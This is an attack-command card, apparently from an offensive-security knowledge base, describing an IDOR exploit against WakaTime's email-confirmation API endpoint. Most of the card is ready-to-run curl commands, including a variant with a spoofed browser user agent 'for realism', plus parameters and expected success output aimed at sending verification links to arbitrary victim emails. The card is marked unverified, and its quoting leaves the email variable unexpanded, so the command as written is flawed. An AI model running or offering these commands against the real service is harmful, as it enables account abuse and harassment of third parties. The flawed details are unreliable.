---
id: cmd-uuid-123
data: >-
  curl -X POST https://wakatime.com/api/v1/users/current/confirm_email -H
  "Content-Type: application/json" -H "X-CSRFToken: $CSRF_TOKEN" -H "Cookie:
  $SESSION_COOKIES" -d '{"email":"$TARGET_EMAIL"}'
tags:
  - web-exploit
  - idor
type: command
output: |-
  HTTP/1.1 201 Created
  {"status":"success"}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.017Z'
verified: false
validated: true
submitted: true
---
# wakatime-confirm-email-idor

## Command

```bash
curl -X POST https://wakatime.com/api/v1/users/current/confirm_email \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: $CSRF_TOKEN" \
  -H "Cookie: $SESSION_COOKIES" \
  -d '{"email":"$TARGET_EMAIL"}'
```

## Description

This command exploits the IDOR vulnerability by sending a POST request to WakaTime's email confirmation endpoint with an arbitrary email address, using an authenticated session to generate a verification link for the target email.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$CSRF_TOKEN` | CSRF protection token from the session | Yes |
| `$SESSION_COOKIES` | Authenticated session cookies | Yes |
| `$TARGET_EMAIL` | Arbitrary email to send verification to | Yes |

## Examples

### Basic Usage

```bash
CSRF_TOKEN="66f16a9ab12e3778160492e8aa76f9fdf9ca7cf7"
SESSION_COOKIES="sessionid=abc123"
TARGET_EMAIL="victim@example.com"

curl -X POST https://wakatime.com/api/v1/users/current/confirm_email \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: $CSRF_TOKEN" \
  -H "Cookie: $SESSION_COOKIES" \
  -d '{"email":"$TARGET_EMAIL"}'
```

### Advanced Usage

Include full headers for realism:

```bash
curl -X POST https://wakatime.com/api/v1/users/current/confirm_email \
  -H "Host: wakatime.com" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0" \
  -H "Accept: */*" \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: $CSRF_TOKEN" \
  -H "Cookie: $SESSION_COOKIES" \
  -d '{"email":"$TARGET_EMAIL"}'
```

## Expected Output

HTTP 201 Created response body like {"status":"success", "message":"Email sent"}, indicating the verification email was dispatched to the target without validation errors.

## Related

- [[procedures/Exploit-IDOR-in-WakaTime-Email-Confirmation]]
